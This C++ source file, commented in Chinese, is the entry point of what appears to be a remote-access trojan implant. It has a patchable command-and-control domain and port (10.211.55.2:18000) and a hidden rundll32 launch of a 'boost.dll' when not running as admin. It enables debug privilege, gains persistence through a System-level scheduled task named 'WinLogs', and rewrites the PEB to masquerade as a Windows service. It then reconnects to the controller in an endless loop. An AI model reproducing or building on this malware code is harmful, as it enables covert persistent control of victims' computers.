﻿// rawFood.cpp : 定义应用程序的入口点。
//

#include "pch.h"
#include "framework.h"
#include "rawFood.h"

// 为了hunter端编译时能够定位字符串
// 这里补结尾零 是为了hunter修改编译好的程序中的字符串时
// 有一定的余量去填入域名信息 特别是release版本时防止出错
int gOffsetDomain = 10;
char gDomain[100] = "BLACKHAWK:10.211.55.2\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
int gOffsetPort = 12;
char gPort[100] = "HAWKISBLACK:18000\0\0\0\0\0";

// 存放修改peb之前的原路径
char g_szCurrentDirectory[MAX_PATH];


int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	// 准备工作
	if (!IsReady()) {
		return -1;
	}

	if (!IsRunasAdmin()) {
		WinExec("C:\\Windows\\System32\\rundll32.exe C:\\BaiduNetDisk\\boost.dll SpeedUp",
			SW_HIDE);
		return -1;
	}

	CToolhelp::EnablePrivilege(SE_DEBUG_NAME, true);

	// 添加自启动
	CMyTaskSchedule task;
	task.NewTask((char*)"WinLogs", 
		(char*)"C:\\BaiduNetDisk\\WinLogs.exe", (char*)"System");


	// 修改peb之前 拿到自身正确地址
	::GetModuleFileName(NULL, g_szCurrentDirectory, MAX_PATH);

	// 修改PEB伪装进程信息
	DisguiseProcess((wchar_t*)L"C:\\WINDOWS\\System32\\WinLogs.exe (LocalSevices -p)",
		(wchar_t*)L"C:\\WINDOWS\\System32\\WinLogs.exe -k LocalSevices -p");

	// 启动windows异步套接字
	WSAData wsaData;
	if (WSAStartup(MAKEWORD(2, 1), &wsaData)) {
		OutputDebugStringA("Failed to initialize WSA\r\n");
		return -1;
	}

	Food newFood;
	newFood.hInst = hInstance;
	while (1) {
		// 如果断开了，隔一秒自动连接
		char domain[100] = { 0 };
		char* domainStartPos = (char*)gDomain + gOffsetDomain;
		newFood.connectTo(domainStartPos, atoi(gPort + gOffsetPort));
		Sleep(1000);
	}


	return 0;
}
